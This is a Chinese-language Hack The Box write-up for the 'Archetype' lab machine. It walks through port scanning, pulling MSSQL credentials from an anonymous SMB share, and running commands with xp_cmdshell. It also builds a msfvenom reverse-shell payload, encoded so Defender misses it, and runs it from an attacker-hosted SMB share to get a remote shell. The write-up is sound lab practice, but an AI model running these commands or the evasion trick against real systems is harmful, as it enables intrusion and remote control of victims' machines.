---
title: Archetype (Hack The Box Writeup)
date: 2021-09-09T13:35:00+08:00
draft: false
url: "/2021/09/09/archetype-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

## 掃 Port

- `rustscan -a 10.10.10.27 -r 1-65535`![](/uploads/2022/02/98414-6PRRYI7.png)nmap 繼續掃- `nmap -A -p135,139,445,5985,47001,49664,49665,49666,49667,49669,49668 10.10.10.27`![](/uploads/2022/02/a02c9-POqdmAS.png)
- 一堆的 RPC
- SMB
- 1433 是 MSSQL

## SMB

- SMB 匿名登入![](/uploads/2022/02/8f1b0-Vg6LtQ4.png)
- 發現 `backups`backups 資料夾- ![](/uploads/2022/02/5659a-0Dvwki0.png)一個 Config 載下來![](/uploads/2022/02/36002-bnrHBxW.png)取得密碼資訊- ![](/uploads/2022/02/81a88-fMJGZxe.png)
- Host Name : `ARCHETYPE`
- User ID : `sql_svc`
- Password : `M3g4c0rp123`

## MSSQL

- 安裝 impacket`sudo apt install python3-impacket``impacket-mssqlclient -p 1433 sql_svc@10.10.10.27 -windows-auth`- ![](/uploads/2022/02/3d241-nGRTDxW.png)MSSQL 取得 Shell 就有機會可以 RCE- `exec xp_cmdshell '{指令}'``systeminfo`- ![](/uploads/2022/02/e183b-WkKnCCm.png)`dir`- `exec xp_cmdshell 'dir'`透過開啟本地 smb- `impacket-smbserver meow .`準備 Reverse shell- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.16 LPORT=7877 -e x86/shikata_ga_nai -f exe > shell.exe`經測試，不掛 `x86/shikata_ga_nai` 就會被 Defender 吃掉

## Shell

- 執行 Shell`exec xp_cmdshell '\\10.10.16.16\meow\shell.exe'`
- ![](/uploads/2022/02/61034-RpWsOBY.png)收回 Reverse shell- ![](/uploads/2022/02/c45bf-AMKdllY.png)取得 User Flag
